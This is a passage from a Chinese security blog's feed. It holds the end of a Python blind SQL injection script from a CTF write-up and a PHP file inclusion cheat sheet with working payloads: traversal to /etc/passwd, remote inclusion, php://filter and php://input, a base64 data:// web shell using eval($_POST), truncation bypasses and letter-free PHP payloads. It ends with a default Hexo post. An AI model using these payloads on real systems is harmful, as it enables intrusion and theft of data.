response.status_code = &quot;Connection refused&quot;</span><br><span class="line">                print(&apos;retry....&apos;)</span><br><span class="line">                time.sleep(0.5)</span><br><span class="line">                j = j - 1</span><br><span class="line">            j += 1</span><br><span class="line">        if result != &apos;&apos;:</span><br><span class="line">            print(str(i) + &apos;:&apos; + result)</span><br><span class="line">            Text_name.append(result)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    return Text_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    database_name = Get_Database_name(10)</span><br><span class="line">    print(&apos;database:&apos;+database_name)</span><br><span class="line">    table_name = Get_Table_name(database_name)</span><br><span class="line">    print(&apos;table:&apos;)</span><br><span class="line">    print(table_name)</span><br><span class="line">    column_name = Get_Column_name(table_name[0])</span><br><span class="line">    print(&apos;column&apos;)</span><br><span class="line">    print(column_name)</span><br><span class="line">    text = Get_Column_text(database_name, table_name[0], column_name[2])</span><br><span class="line">    print(&apos;text:&apos;)</span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><p>运行程序即可获得password:<br><img src="/2018/11/08/SQL盲注/1.png" alt="">  </p><p>对MD5解码后输入登陆框得falg:<br><img src="/2018/11/08/SQL盲注/2.png" alt="">  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-原理及分类&quot;&gt;&lt;a href=&quot;#0x01-原理及分类&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理及分类&quot;&gt;&lt;/a&gt;0x01 原理及分类&lt;/h2&gt;&lt;p&gt;SQL盲注是指在无法使用详细数据库错误消息或带内数据连接的情况下，利用数据库
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞总结</title>
    <link href="http://yoursite.com/2018/11/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2018/11/04/文件包含漏洞总结/</id>
    <published>2018-11-04T12:10:19.000Z</published>
    <updated>2018-12-05T13:13:35.407Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-基本原理"><a href="#0x01-基本原理" class="headerlink" title="0x01 基本原理"></a>0x01 基本原理</h3><p>服务端执行用户能控制的脚本或代码，主要有本地文件包含和远程文件包含两种。  </p><p>常见包含函数有：include()、require()<br>include()是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行<br>require()是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行<br>require()一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。 </p><p><strong>无论文件的后缀是什么，只要内容符合php语法，任何扩展名都可以被php解析。</strong>  </p><h3 id="0x02-本地文件包含"><a href="#0x02-本地文件包含" class="headerlink" title="0x02 本地文件包含"></a>0x02 本地文件包含</h3><p>payload:?f=../flag.txt<br>./当前目录<br>../上一级目录,这样的遍历目录来读取文件<br>加多个../可保证到达根目录<br>可以使用file协议绕过对 ../ 的过滤  </p><h3 id="0x03-远程文件包含"><a href="#0x03-远程文件包含" class="headerlink" title="0x03 远程文件包含"></a>0x03 远程文件包含</h3><p>将恶意脚本提前放在远程服务器上，payload:?f=[http:]//xxx.xxx.xxx/xxx.txt<br>适用情况：allow_url_fopen=On &amp;&amp; allow_url_include=On (可通过phpinfo获得)  </p><h3 id="0x4-利用php流php-filter"><a href="#0x4-利用php流php-filter" class="headerlink" title="0x4 利用php流php://filter"></a>0x4 利用php流php://filter</h3><p><strong>参数</strong></p><ul><li>resource=&lt;要过滤的数据流&gt; :    指定了你要筛选过滤的数据流。     必选  </li><li>read=&lt;读链的筛选列表&gt; :    可以设定一个或多个过滤器名称，以管道符（|）分隔。     可选  </li><li>write=&lt;写链的筛选列表&gt; :    可以设定一个或多个过滤器名称，以管道符（|）分隔。     可选  </li><li>&lt;；两个链的筛选列表&gt; :    任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。  </li></ul><p>payload:<br>?file=php://filter/convert.base64-encode/resource=index.php  </p><h3 id="0x05-利用php流input-post方式发送"><a href="#0x05-利用php流input-post方式发送" class="headerlink" title="0x05 利用php流input(post方式发送)"></a>0x05 利用php流input(post方式发送)</h3><p>?file=php://input<br>需要allow_url_include=On<br><img src="/2018/11/04/文件包含漏洞总结/1.png" alt=""></p><h3 id="0x06-利用data-urls"><a href="#0x06-利用data-urls" class="headerlink" title="0x06 利用data urls"></a>0x06 利用data urls</h3><p>需要allow_url_include=On<br>pyload:?file=data://text/plain;base64,base64编码的payload<br>例如：<br><a href="http://xxx.xxx.xxx/?filename=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOyA/Pg==" target="_blank" rel="noopener">http://xxx.xxx.xxx/?filename=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOyA/Pg==</a><br>base64解码为：&lt;?php @eval($_POST[‘pass’]); ?&gt;<br><img src="/2018/11/04/文件包含漏洞总结/2.png" alt=""> </p><h3 id="0x07-绕过"><a href="#0x07-绕过" class="headerlink" title="0x07 绕过"></a>0x07 绕过</h3><p>审计中常见：&lt;?php include(“inc/“ . $_GET[‘file’] . “.htm”); ?&gt;等条件限制   </p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p>payload:/etc/passwd%00<br>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)   </p><h5 id="绕过"><a href="#绕过" class="headerlink" title="? 绕过"></a>? 绕过</h5><p>paload:/etc/passwd?  </p><h5 id="文件路径截断"><a href="#文件路径截断" class="headerlink" title="文件路径截断"></a>文件路径截断</h5><p>/etc/passwd/passwd././././././.[…]/./././././.<br>/etc/passwd……………………….<br>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)   </p><h5 id="不包含数字和字母的payload"><a href="#不包含数字和字母的payload" class="headerlink" title="不包含数字和字母的payload"></a>不包含数字和字母的payload</h5><p>原理:$_GET[0]($_GET[1]):0为函数名，1为参数  </p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag  </span><br><span class="line">?code=$&#123;%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22&#125;[%27%2b%27]();&amp;%2b=flag  </span><br><span class="line">&quot;$&quot;.(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;&#125;&quot;).(&quot;&gt;&quot;^&quot;&#123;&quot;).(&quot;/&quot;^&quot;&#123;&quot;).&quot;[&apos;+&apos;]&quot;&amp;+=getFlag();//$_GET[&apos;+&apos;]&amp;+=getFlag();  </span><br><span class="line">?code=$&#123;&quot;!&quot;^&quot;~&quot;&#125;=&quot;]%];,&lt;&lt;&quot;^&quot;:@)&#125;@][&quot;;$&#123;&quot;!&quot;^&quot;~&quot;&#125;();</span><br></pre></td></tr></table></figure></p><h5 id="其他文件协议"><a href="#其他文件协议" class="headerlink" title="其他文件协议"></a>其他文件协议</h5><p>zip协议:<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a><br>payload:?file=zip://C:/payload/php.zip%23php.jpg<br>解析php.jpg是否符合php语法规则，是则执行</p><p>phar协议:<a href="http://php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.phar.php</a><br>自5.30起生效<br>参考:<br><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="noopener">https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html</a></p><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/include_file.html</a><br><a href="http://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/119150.html</a><br><a href="https://blog.csdn.net/qq_33020901/article/details/78706764" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/78706764</a><br><a href="https://www.liuxianglai.top/?p=145" target="_blank" rel="noopener">https://www.liuxianglai.top/?p=145</a><br><a href="http://blog.51cto.com/tdcqvip/1958654" target="_blank" rel="noopener">http://blog.51cto.com/tdcqvip/1958654</a><br><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">https://www.freebuf.com/column/148886.html</a><br><a href="https://www.cnblogs.com/iamstudy/category/729449.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/category/729449.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-基本原理&quot;&gt;&lt;a href=&quot;#0x01-基本原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本原理&quot;&gt;&lt;/a&gt;0x01 基本原理&lt;/h3&gt;&lt;p&gt;服务端执行用户能控制的脚本或代码，主要有本地文件包含和远程文件包含两种。  &lt;/p&gt;
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2018/11/03/hello-world/"/>
    <id>http://yoursite.com/2018/11/03/hello-world/</id>
    <published>2018-11-02T17:49:33.831Z</published>
    <updated>2018-11-02T17:49:33.831Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
